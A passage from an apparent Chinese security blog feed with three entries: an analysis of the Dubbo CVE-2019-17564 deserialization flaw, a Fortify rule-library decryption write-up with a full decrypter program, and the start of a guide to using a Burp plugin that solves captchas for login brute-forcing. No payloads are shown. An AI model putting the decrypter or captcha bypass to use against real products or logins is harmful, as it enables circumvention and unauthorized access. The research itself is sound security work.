class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时dubbo依赖zookeeper,请自行安装！</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>dubbo启用http协议后，所有的请求都会通过<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler</code>类的<code>handle</code>方法进行处理。我们在这打断点，并发送poc开始跟踪分析。</p><p>首先<code>handle</code>方法会获取请求路径，然后通过这个路径去<code>skeletonMap</code>里获取到该接口对应的处理对象，来处理当前<code>request</code>请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.dubbo.rpc.protocol.http.HttpProtocol$InternalHandler</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取请求的路径(/org.apache.dubbo.samples.http.api.DemoService)</span></span><br><span class="line">    String uri = request.getRequestURI();</span><br><span class="line">    <span class="comment">// 2. 通过请求的接口路径获取对应的处理对象</span></span><br><span class="line">    HttpInvokerServiceExporter skeleton = (HttpInvokerServiceExporter)HttpProtocol.<span class="keyword">this</span>.skeletonMap.get(uri);</span><br><span class="line">    <span class="keyword">if</span> (!request.getMethod().equalsIgnoreCase(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        response.setStatus(<span class="number">500</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        RpcContext.getContext().setRemoteAddress(request.getRemoteAddr(), request.getRemotePort());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 使用获取到的处理对象进行处理请求</span></span><br><span class="line">            skeleton.handleRequest(request, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步中存储接口地址和处理对象的<code>skeletonMap</code></p><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/skeletonMap.png" alt="skeletonMap存储内容"></p><p>处理对象是<code>HttpInvokerServiceExporter</code>类对象，它负责获取远程调用对象，并执行获取结果返回给客户端。跟进它的<code>handleRequest</code>方法，<code>request</code>对象被传入<code>readRemoteInvocation</code>方法中来获取<code>RemoteInvocation</code>远程调用对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 从request对象获取远程调用对象</span></span><br><span class="line">        RemoteInvocation invocation = <span class="keyword">this</span>.readRemoteInvocation(request);</span><br><span class="line">        RemoteInvocationResult result = <span class="keyword">this</span>.invokeAndCreateResult(invocation, <span class="keyword">this</span>.getProxy());</span><br><span class="line">        <span class="keyword">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NestedServletException(<span class="string">"Class not found during deserialization"</span>, var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readRemoteInvocation</code>方法将<code>request.getInputStream()</code>(我们提交的序列化内容)传入<code>createObjectInputStream</code>方法，封装为一个<code>ObjectInputStream</code>。该对象又被传入<code>doReadRemoteInvocation</code>方法中，进行最终的获取操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 传入request对象和request.getInputStream()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.readRemoteInvocation(request, request.getInputStream());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 2. 将request.getInputStream()封装为ObjectInputStream</span></span><br><span class="line">    ObjectInputStream ois = <span class="keyword">this</span>.createObjectInputStream(<span class="keyword">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">    RemoteInvocation var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 获取RemoteInvocation远程调用对象</span></span><br><span class="line">        var4 = <span class="keyword">this</span>.doReadRemoteInvocation(ois);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>doReadRemoteInvocation</code>方法中，<code>ObjectInputStream</code>类对象<code>ois</code>直接被反序列化了。这个过程中没有进行任何过滤，导致我们传入的恶意序列化对象可以被反序列化创建，漏洞触发！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.remoting.rmi.org.springframework.remoting.rmi.RemoteInvocationSerializingExporter</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> RemoteInvocation <span class="title">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 恶意对象在此被反序列化，漏洞触发</span></span><br><span class="line">    Object obj = ois.readObject();</span><br><span class="line">    <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RemoteException(<span class="string">"Deserialized object needs to be assignable to type ["</span> + RemoteInvocation.class.getName() + <span class="string">"]: "</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/exploit-demo.png" alt="利用演示"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>漏洞出现的原因<code>dubbo</code>HTTP接口将携带有恶意反序列化数据的<code>request</code>，在无安全校验的情况下直接交给了<code>spring-web.jar</code>的<code>HttpInvokerServiceExporter</code>进行处理，导致存在反序列化漏洞。按理说这个漏洞不仅仅只是<code>dubbo</code>自身的问题，还是<code>spring</code>的问题。</p><p>在2.7.4.1版本开始，dubbo处理HTTP接口的调用请求交给了<code>jsonrpc4j.jar</code>的<code>JsonRpcServer</code>去处理了。</p><p><img src="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/fix.png" alt="修复方式"></p><p>跟踪分析<code>JsonRpcServer</code>类的<code>handle</code>方法后，<code>request.getInputStream()</code>没有再被反序列化了。所以原来的利用方法失效了。</p><h2 id="0x06-漏洞总结"><a href="#0x06-漏洞总结" class="headerlink" title="0x06 漏洞总结"></a>0x06 漏洞总结</h2><p>该漏洞利用虽然简单粗暴，但在黑盒情况下利用难点有两个，一是我们无法得知web服务是否是dubbo http接口。二是如何获取接口路径，该路径可以在服务器上的<code>zookeeper</code>和<code>http-provider</code>配置文件中找到，如果不配合其他漏洞是不容易获取的。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html" target="_blank" rel="noopener">https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html</a></li><li><a href="https://mp.weixin.qq.com/s/CMA79NyeZN2e_nSxj8L-wQ" target="_blank" rel="noopener">CVE-2019-17564：Apache Dubbo反序列化漏洞分析</a></li><li><a href="https://mp.weixin.qq.com/s/pHnhHMNArAiZPVGR1btZIg" target="_blank" rel="noopener">【安全风险通告】Apache Dubbo反序列化漏洞安全风险通告</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fortify规则库解密之旅</title>
      <link href="/articles/2019/fortify-rule-library-decryption-process/"/>
      <url>/articles/2019/fortify-rule-library-decryption-process/</url>
      
        <content type="html"><![CDATA[<p>前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。</p><h2 id="0x01-解密思路"><a href="#0x01-解密思路" class="headerlink" title="0x01 解密思路"></a>0x01 解密思路</h2><p>猜测fortify会和AWVS一样，会将规则库加载到内存当中进行解密，然后再使用其进行代码扫描。基于这个想法，它必然存在一个解密方法，而这个方法肯定在某个jar当中。锁定负责解密的jar之后，就可以审计jar的所有方法。然后通过调试来理清解密流程，最后我们就可以写代码来模拟这个过程，来解密规则库。</p><h2 id="0x02-定位解密jar"><a href="#0x02-定位解密jar" class="headerlink" title="0x02 定位解密jar"></a>0x02 定位解密jar</h2><p>通过反编译发现fortify依赖的jar基本都没有混淆，说明我们可以通过<code>jar名</code>和<code>类名</code>来初步锁定加密方法所在jar。类名搜索工具使用的是我在<a href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/">《如何快速找到POC/EXP依赖的jar？》</a>一文中开发的<code>SearchClassInJar.jar</code>。在分别尝试<code>encrypt</code>,<code>decrypt</code>,<code>crypto</code>,<code>rule</code>,<code>fortify</code>等关键字后,最终搜索到两个可疑jar。</p><ol><li>fortify-common-17.10.0.0156.jar</li><li>fortify-crypto-1.0.jar</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/F42189E8-11C8-4825-A49B-58FD79640C35.png" alt="搜索解密jar"></p><h2 id="0x03-定位解密方法"><a href="#0x03-定位解密方法" class="headerlink" title="0x03 定位解密方法"></a>0x03 定位解密方法</h2><h4 id="3-1-通过调试定位"><a href="#3-1-通过调试定位" class="headerlink" title="3.1 通过调试定位"></a>3.1 通过调试定位</h4><p>定位解密方法最好的方法就是调试。打开fortify的<code>\Core\private-bin\awb\productlaunch.cmd</code>脚本，在最后一行如下图位置粘贴调试配置，就可以以调试模式启动fortify。然后配置IDEA连接5005端口即可进行调试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/ECBDE745-99FE-40AC-8C13-D1267B9CA5BB.png" alt="让fortify开启调试模式"></p><p>通过审计这两个jar代码，基本确定<code>fortify-crypto-1.0.jar</code>就是加解密方法所在。通过函数名，参数类型，代码逻辑确定了如下涉及解密的可疑方法，并给它们都打上断点。</p><ol><li>void <code>decrypt</code>(long[] v, long[] k)</li><li>void <code>dec</code>(InputStream source, OutputStream dest, long[] usrKey)</li><li>InputStream <code>decryptCompressedAfterHeaders</code>(InputStream encrypted, String keyString)</li><li>InputStream <code>decryptAfterHeaders</code>(InputStream encrypted, String keyString, boolean compressed)</li><li>InputStream <code>decryptCompressed</code>(InputStream encrypted, String keyString)</li><li>void <code>encryptAfterHeaders</code>(InputStream stream, OutputStream ciphertext, String keyString, boolean compress)</li></ol><p>接着运行fortify扫描一个<code>java web demo</code>，最终漏洞是扫描出来了，但是没有一个可疑方法被调用，甚是奇怪。于是我将所有方法都打上断点，发现扫描期间只有<code>readHeaders(InputStream encrypted)</code>被调用了。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/8128736C-CBCB-4521-9E67-E33D900E0756.png" alt="扫描期间只有readHeaders方法被调用"></p><p>难道fortify并没有在扫描时对规则进行解密，可以直接读取规则内容？后面通过调用栈上下文也没发现解密操作。</p><h4 id="3-2-通过编码调用定位"><a href="#3-2-通过编码调用定位" class="headerlink" title="3.2 通过编码调用定位"></a>3.2 通过编码调用定位</h4><p>这时一个朋友突然叫去包饺子，我才记起今天是冬至。为了速战速决，我决定 通过写代码直接将规则库传入到可疑方法中进行解密，然后看返回的解密结果是否是有意义的明文来判断是否是我们要找的解密方法。 于是将CryptoUtil类中的所有代码审计一遍之后，发现decryptCompressed()可以解密压缩一个文件，感觉看到来希望。​</p><p>下面我们来看看该方法的运行流程。该方法最终会调用decryptAfterHeaders()，它负责控制解密解压整个流程。可以看到如果key没设置会被设置为默认值。接着会调用doBlockCipher()来解密，使用uncompressString来解压。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/0B404A33-CFBB-49CF-BE75-FB2364DEA968.png" alt="解密压缩方法decryptAfterHeaders()"></p><p>我们再来看看<code>doBlockCipher()</code>方法,它可以进行加密和解密。传入的是<code>false</code>所以是解密。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/DC72BDA4-2492-405B-AC9A-3815A386311A.png" alt="doBlockCipher()方法调用dec对文件进行解密"></p><p>而最终文件内容会被传入<code>dec()</code>方法解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dec</span><span class="params">(InputStream source, OutputStream dest, <span class="keyword">long</span>[] usrKey)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">long</span>[] k = (<span class="keyword">long</span>[])((<span class="keyword">long</span>[])usrKey.clone());</span><br><span class="line">    <span class="keyword">byte</span>[] byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">byte</span>[] byteBufDelay = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">long</span>[] unsigned32Buf = <span class="keyword">new</span> <span class="keyword">long</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">long</span> top = <span class="number">4294967295L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> bytesRead;</span><br><span class="line">    <span class="keyword">while</span>((bytesRead = source.read(byteBuf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytesRead &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byteArrayToUnsigned32(byteBuf, unsigned32Buf);</span><br><span class="line">        decrypt(unsigned32Buf, k);</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">0</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">1</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">2</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">3</span>] + <span class="number">17L</span> &amp; top;</span><br><span class="line">        unsigned32ToByteArray(unsigned32Buf, byteBuf);</span><br><span class="line">        <span class="keyword">if</span> (source.available() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> bytesToWrite = byteBuf[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">if</span> (bytesToWrite &gt; <span class="number">8</span> || bytesToWrite &lt; <span class="number">0</span> || byteBufDelay == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid encrypted stream"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, bytesToWrite);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (byteBufDelay != <span class="keyword">null</span>) &#123;</span><br><span class="line">            dest.write(byteBufDelay, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] t = byteBufDelay;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = t;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们确定decryptCompressed()可以解密解压一个文件，至于是否可以是规则库文件，我们可以写如下代码来测试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/117337DD-962F-4B64-90AF-AC4C98D92F47.png" alt="decryptCompressed()方法可以完美解密规则库文件"></p><p>发现解密结果是有意义的xml文件内容，完美解密！</p><h2 id="0x04-编写解密程序"><a href="#0x04-编写解密程序" class="headerlink" title="0x04 编写解密程序"></a>0x04 编写解密程序</h2><p>理清整个过程后，解密就很简单了。说白了就是批量调用fortify自带的<code>fortify-crypto-1.0.jar</code>中的<code>com.fortify.util.CryptoUtil.decryptCompressed()</code>方法进行解密。最后附上解密程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.fortify.util.CryptoUtil.decryptCompressed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FortifyRuleDecrypter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String ruleDir;</span><br><span class="line">    <span class="keyword">private</span> String saveDir;</span><br><span class="line"></span><br><span class="line">    FortifyRuleDecrypter(String ruleDir,String saveDir)&#123;</span><br><span class="line">        <span class="keyword">this</span>.ruleDir = ruleDir;</span><br><span class="line">        <span class="keyword">this</span>.saveDir = saveDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">doDecrypt</span><span class="params">()</span></span>&#123;</span><br><span class="line">        File encryptRule = <span class="keyword">new</span> File(ruleDir);</span><br><span class="line">        <span class="comment">// 传入的是文件</span></span><br><span class="line">        <span class="keyword">if</span>(encryptRule.isFile()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(encryptRule.getName().endsWith(<span class="string">".bin"</span>)) &#123;</span><br><span class="line">                decryptRule(encryptRule, <span class="keyword">new</span> File(saveDir + File.separator + encryptRule.getName() + <span class="string">".xml"</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"[-] The rule file suffix is.bin!"</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//传入是目录</span></span><br><span class="line">        <span class="keyword">if</span> (encryptRule.isDirectory()) &#123;</span><br><span class="line">            File[] listFile = encryptRule.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File file:listFile)&#123;</span><br><span class="line">                <span class="keyword">if</span>(file.getName().endsWith(<span class="string">".bin"</span>))&#123;</span><br><span class="line">                    File saveName = <span class="keyword">new</span> File(saveDir + File.separator + file.getName().replace(<span class="string">".bin"</span>,<span class="string">""</span>) + <span class="string">".xml"</span>);</span><br><span class="line">                    decryptRule(file,saveName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">decryptRule</span><span class="params">(File encFile, File decFile)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//调用decryptCompressed()对规则库进行解密</span></span><br><span class="line">            InputStream ruleStream = decryptCompressed(<span class="keyword">new</span> FileInputStream(encFile), <span class="keyword">null</span>);</span><br><span class="line">            OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(decFile);</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((ruleStream.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                outputStream.write(b);</span><br><span class="line">            &#125;</span><br><span class="line">            ruleStream.close();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(String.format(<span class="string">"[+] success %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"[-] fail %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java -jar FortifyRuleDecrypter.jar [rule_dir|rule_file] &lt;save_dir&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FortifyRuleDecrypter decrypter = <span class="keyword">new</span> FortifyRuleDecrypter(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        decrypter.doDecrypt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/fortify-rule-library-decryption-process/726FEDA7-ABD4-4EED-9431-B87C034A5F5C.png" alt="解密效果"></p><h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>最终为了快速解决问题，通过编码调用锁定解密方法，确实有运气的成分。​最终虽然解决了问题，但依然存在如下疑问，只能等有空再研究。先赶时间去朋友那撸猫包饺子去了！</p><ol><li>fortify在扫描时没有调用解密方法，难道是加密的规则库可以直接用于扫描？</li><li>如果扫描无需解密规则库，那为何fortify又要在jar中提供解密方法？</li><li>到底解密方法在哪里被调用？</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/dumplings-and-cat.jpeg" alt="冬至的夜晚"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fortify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用burp插件captcha-killer识别图片验证码</title>
      <link href="/articles/2019/burp-captcha-killer-usage/"/>
      <url>/articles/2019/burp-captcha-killer-usage/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-开发背景"><a href="#0x01-开发背景" class="headerlink" title="0x01 开发背景"></a>0x01 开发背景</h2><p>说起对存在验证码的登录表单进行爆破，大部分人都会想到<code>PKav HTTP Fuzzer</code>，这款工具在前些年确实给我们带来了不少便利。反观burp一直没有一个高度自定义通杀大部分图片验证码的识别方案，于是抽了点闲暇的时间开发了<a href="https://github.com/c0ny1/captcha-killer" target="_blank" rel="noopener">captcha-kille</a>，希望burp也能用上各种好用的识别码技术。其设计理念是<code>只专注做好对各种验证码识别技术接口的调用！</code>说具体点就是burp通过同一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码。今天不谈编码层面如何设计，感兴趣的可以去github看源码。此处只通过使用步骤来说明设计的细节。</p><h2 id="0x02-Step1-将获取验证码的数据包发送到插件"><a href="#0x02-Step1-将获取验证码的数据包发送到插件" class="headerlink" title="0x02 Step1:将获取验证码的数据包发送到插件"></a>0x02 Step1:将获取验证码的数据包发送到插件</h2><p>使用burp抓取获取验证码数据包，然后右键<code>captcha-killer</code> -&gt; <code>send to captcha panel</code>发送数据包到插件的验证码请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-1.png" alt="将请求验证码数据包发送到插件"></p><p>然后到切换到插件面板，点击获取即可拿到要识别的验证码图片内容。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-2.png" alt="请求获取验证码"></p><p><strong>注意：获取验证码的cookie一定要和intruder发送的cookie相同！</strong></p><h2 id="0x03-Step2-配置识别接口的地址和请求包"><a href="#0x03-Step2-配置识别接口的地址和请求包" class="headerlink" title="0x03 Step2:配置识别接口的地址和请求包"></a>0x03 Step2:配置识别接口的地址和请求包</h2><p>拿到验证码之后，就要设置接口来进行识别了。我们可以使用网上寻找免费的接口，用burp抓包，然后右键发送到插件的接口请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-1.png" alt="将接口调用请求发送到插件"></p><p>然后我们把图片内容的位置用标签来代替。比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么<code>Request template</code>(请求模版)面板应该填写如下：</p><p><img 